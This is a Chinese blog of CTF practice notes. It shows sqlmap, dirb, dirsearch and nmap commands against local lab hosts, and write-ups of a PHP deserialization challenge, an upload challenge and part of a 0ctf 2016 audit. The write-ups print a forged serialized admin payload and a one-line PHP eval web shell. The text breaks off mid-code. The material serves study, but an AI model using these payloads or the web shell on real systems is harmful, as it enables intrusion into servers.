<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u <span class="string">&quot;http://127.0.0.1/?id=1&amp;name=1&quot;</span> -p <span class="string">&quot;id&quot;</span> --random-agent -technique=T -level <span class="number">2</span> -v <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>–p 指定注入参数<br>–level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）<br><code>level等级变化，sqlmap采用的payload也会有变化，另外还会影响注入点。HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。总之，在不确定哪个Payload或参数为注入点时，为保证全面性，建议使用高的level值，但是代价就是更慢的扫描速度。</code><br>安利：<a href="https://blog.csdn.net/qq_45719090/article/details/129241110">https://blog.csdn.net/qq_45719090/article/details/129241110</a><br><code>4、如何保证目录扫描不遗漏</code><br>在上面进行目录扫描时，由于只使用了一个目录扫描工具，导致扫描结果不全，致使遗漏了一些关键信息。<br>解决这个问题的最好办法就是使用多个目录扫描工具。<br><code>dirb</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">dirb <span class="string">&quot;http://192.168.200.6/&quot;</span> <span class="regexp">/usr/</span>share<span class="regexp">/dirb/</span>wordlists/big.txt</span><br></pre></td></tr></table></figure>
<p>扫出来了吧，&#x2F;phpmy。<br><img src="https://pic.imgdb.cn/item/656a9cdac458853aefba277d.jpg"><br><code>dirsearch</code><br>我在物理机装了，就用物理机扫。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> dirsearch.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://192.168.200.6/&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/656a9d62c458853aefbbe6b4.jpg"><br>就这样,多个工具一起扫，才可以更详细。<br><code>5、nmap扫描如何更加全面</code><br>常规端口扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sT <span class="number">192.168.200.6</span> -p- --min-rate=<span class="number">100000</span> -<span class="literal">oN</span> nmapscan/ports</span><br></pre></td></tr></table></figure>
<p><code>这个命令的意思是</code><br>使用TCP连接扫描（-sT）对IP地址为192.168.200.6的主机进行端口扫描，扫描所有端口（-p-），设置最小速率为100000（–min-rate&#x3D;100000），并将扫描结果保存到文件nmapscan&#x2F;ports中（-oN nmapscan&#x2F;ports）。<br><img src="https://pic.imgdb.cn/item/656a9cfac458853aefba8d7b.jpg"><br>详细服务扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sT -sC -sV -O -p22,<span class="number">80</span> <span class="number">192.168.200.6</span> -<span class="literal">oN</span> nmapscan/detail</span><br></pre></td></tr></table></figure>
<p><code>这个命令的意思是</code><br>对IP地址为192.168.200.6的主机进行详细的端口扫描。具体参数的含义如下：<br>-sT: 使用TCP连接扫描 -sC: 使用默认的脚本扫描 -sV: 对开放端口进行版本检测 -O: 进行操作系统检测 -p22,80: 只扫描端口22和端口80 -oN nmapscan&#x2F;detail: 将扫描结果保存到文件nmapscan&#x2F;detail中<br><img src="https://pic.imgdb.cn/item/656a9d0bc458853aefbabfbc.jpg"><br>默认脚本漏洞扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -script=vuln -p22,<span class="number">80</span> <span class="number">192.168.200.6</span> -<span class="literal">oN</span> nmapscan/vuln</span><br></pre></td></tr></table></figure>
<p><code>这个命令的意思是</code><br>对IP地址为192.168.31.180的主机进行漏洞扫描。具体参数的含义如下：<br>-script&#x3D;vuln: 使用Nmap的漏洞扫描脚本进行扫描 -p22,80: 只扫描端口22和端口80 -oN nmapscan&#x2F;vuln: 将扫描结果保存到文件nmapscan&#x2F;vuln中<br><img src="https://pic.imgdb.cn/item/656a9d17c458853aefbae7c9.jpg"><br>以上都是向朋友请教的，以后尝试一下。</p>
<h2 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h2><p>1、sql注入中的转义符：<a href="https://blog.csdn.net/lzu_lfl/article/details/129717185">https://blog.csdn.net/lzu_lfl/article/details/129717185</a><br>2、kali-sqlmap：<a href="https://blog.csdn.net/2201_76034619/article/details/131436295">https://blog.csdn.net/2201_76034619/article/details/131436295</a><br>3、sqlmap命令大全：<a href="https://blog.csdn.net/qq_45719090/article/details/129241110">https://blog.csdn.net/qq_45719090/article/details/129241110</a><br>4、目录扫描工具dirmap：<a href="https://zhuanlan.zhihu.com/p/91927546">https://zhuanlan.zhihu.com/p/91927546</a></p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>200wCSOE|Recording</title>
    <url>/2023/10/29/csoeDGUT/</url>
    <content><![CDATA[<h2 id="actf-2021-baby-serialize–代码审计-php反序列化"><a href="#actf-2021-baby-serialize–代码审计-php反序列化" class="headerlink" title="actf_2021_baby_serialize–代码审计|php反序列化"></a>actf_2021_baby_serialize–代码审计|php反序列化</h2><p>开启靶机,先看一遍源码,发现unserialize()函数<br><img src="https://pic.imgdb.cn/item/653dc16dc458853aefd5d63b.jpg" alt="图一" title="发现unserialize()函数"><br>这个函数就是php的反序列化函数(看到存在这个函数一般就判定考反序列化了),顺便一提serialize()是序列化函数,这两个函数一般配套使用。<br>首先代码审计,发现存在一个类User,那么这是一道存在类情况的反序列化。<br>里面含有魔术方法,若之前没做过或学过,具体看<a href="https://fzsecurity-github.github.io/2023/10/21/fanxuliePHP/">https://fzsecurity-github.github.io/2023/10/21/fanxuliePHP/</a><br>继续,类里面含有两个变量以及三个方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Username</span> = <span class="string">&quot;0xDktb&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Password</span> = <span class="string">&quot;0xDktb111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Username</span> = <span class="string">&quot;0xDktb&quot;</span>;</span><br><span class="line">        <span class="variable">$Password</span> = <span class="string">&quot;0xDktb123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Username == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable language_">$this</span>-&gt;Username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往下,创建一个类对象用来接收get接收的内容,随后对它进行反序列化。</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$user</span> = new User();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="symbol">$</span>_GET[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">    <span class="symbol">$</span>user = unserialize(<span class="symbol">$</span>_GET[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后如果类内方法判断为真,那么输出包含进来的flag.php文件,即flag。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user-&gt;<span class="built_in">isAdmin</span>())&#123;</span><br><span class="line">    echo $flag<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么解题思路也就出来了:就是自己写一个php程序,创建一个类(与题目相同),然后把Username赋值为admin,随后序列化输出即可(这里有一个注意点,等下说)。<br>打开php在线运行工具,进行编程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Password</span> = <span class="string">&quot;0xDktb111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Username</span> = <span class="string">&quot;0xDktb&quot;</span>;</span><br><span class="line">        <span class="variable">$Password</span> = <span class="string">&quot;0xDktb123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Username == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable language_">$this</span>-&gt;Username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="comment">//两种输出形式:var_dump(urlencode(serialize($user)))</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里我序列化后为什么要进行url编码?<br>因为class类内变量的权限为private,序列化后默认有%00,但是不进行url编码时,在线工具运行的结果是这样的<br><img src="https://pic.imgdb.cn/item/653dc1d8c458853aefd726fe.jpg" alt="图二" title="法一url编码"><br>你也可以选择不进行url编码,但是要将没显示出来的字符改为%00<br><img src="https://pic.imgdb.cn/item/653dc198c458853aefd65a05.jpg" alt="图三" title="法二手动加%00"><br>完成后,就可以把这个payload输入网址栏,成功获取flag<br><img src="https://pic.imgdb.cn/item/653dc1eec458853aefd76554.jpg" alt="图四" title="获取flag"></p>
<h2 id="aurora-2021-easyupload"><a href="#aurora-2021-easyupload" class="headerlink" title="aurora_2021_easyupload"></a>aurora_2021_easyupload</h2><p>较简单,直接上传一个含有一句话木马的php文件,通过MINE属性值的绕过检测,随后蚁剑连接即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里讲一下我做的时候的误区:<br>(1)、我上来先搞了个图片马并且成功上传了,但是怎么都连接不上,后来就查阅资料了解到图片马是要配合解析漏洞或文件包含漏洞才可使用的。<br>(2)、走出上一个误区后,我开始直接上传php文件,发现存在过滤,那就开始尝试绕过过滤。我一开始是先把MIME属性改为image&#x2F;png的了,然后我又在文件名上操作,导致上传失败。后来才没改文件名,直接是.php的格式,这才上传成功。<br>学(复习)到:<br>1、测试时,先改MIME属性值,单独测试后再考虑大小写等绕过方式<br>2、图片马:<br>除非网站有解析错误,不然网站不会解析这个图片马;<br>图片马要配合文件包含才可getshell</p>
<h2 id="0ctf-2016-unserialize–-目录扫描-代码审计-php反序列化"><a href="#0ctf-2016-unserialize–-目录扫描-代码审计-php反序列化" class="headerlink" title="0ctf_2016_unserialize–|目录扫描|代码审计|php反序列化"></a>0ctf_2016_unserialize–|目录扫描|代码审计|php反序列化</h2><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>打开靶机,是一个登陆界面<br><img src="https://pic.imgdb.cn/item/654854eec458853aefa3aee1.jpg"><br>查看源码,只知道账号密码是以post方式提交的,除此之外一无所获。<br>尝试着抓包,看看有没有隐藏一些秘密,但是看来看去看不出端倪。<br>然后尝试目录扫描,挨个点开,发现一个疑似源码的压缩包,下载到本地,先尝试着这几个文件都访问一遍。<br><img src="https://pic.imgdb.cn/item/65485514c458853aefa40944.jpg"><br>登陆界面<br><img src="https://pic.imgdb.cn/item/654854eec458853aefa3aee1.jpg"><br>注册界面<br><img src="https://pic.imgdb.cn/item/6548552fc458853aefa44339.jpg"><br>更改信息界面提示要我们登录先,那我们先注册一个用户。<br><img src="https://pic.imgdb.cn/item/65485539c458853aefa45aee.jpg"><br><img src="https://pic.imgdb.cn/item/65485547c458853aefa47940.jpg"><br>更新界面<br><img src="https://pic.imgdb.cn/item/65485559c458853aefa49d75.jpg"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>到这里,基本这几个操作,注册、登录、更新我们都知道了,接下来开始愉快的代码审计了。<br><del>首先我们登陆的时候,会调用index.php验证,而在index.php有这样一句代码:require_once(‘class.php’);这个函数的意义:在php中，require_once语句用于引用或包含外部的一个php文件，语法“require_once(filename)”或“require_once ‘filename’”；如果该语句指定的文件已经被包含过，则不会再次包含。我觉得在执行index.php时会先执行class.php,但是好像不是这样的(php菜鸟一枚)。</del><br><code>index.php</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;<span class="regexp">//</span>session凭证直接免登录</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> or strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			die(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> or strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			die(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;<span class="regexp">//</span>登陆成功</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			die(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个应该就是登录页面，输入账号和密码，如果正确，那就跳转到profile.php页面，就是显示个人信息的页面。<br><code>register.php</code><br>注册页面,就是简单的注册,没有可疑点。<br><code>update.php</code><br>更改信息界面,需要满足一定正则过滤规则才可以更改。<br><code>profile.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到unserialize,就要注意了。可以知道,profile.php内的操作数据,来自于update.php,那么,应该有这样的思路:<code>在update.php传入序列化数据（payload）,是否可以实现获取flag</code><br>继续看,发现</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$photo = base64<span class="constructor">_encode(<span class="params">file_get_contents</span>($<span class="params">profile</span>[&#x27;<span class="params">photo</span>&#x27;])</span>);</span><br></pre></td></tr></table></figure>
<p>因为flag一般在一个文件中，要想知道flag，一般需要读取(php伪协议或php函数)，这里有文件读取功能的函数file_get_contents（）引起了我的注意，我就想，会不会是这个地方能够读取到flag呢？可能也就是说，我们要修改 profile 中的 photo 来读取flag。还有几个文件没有看,我们继续看。<br>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		<span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 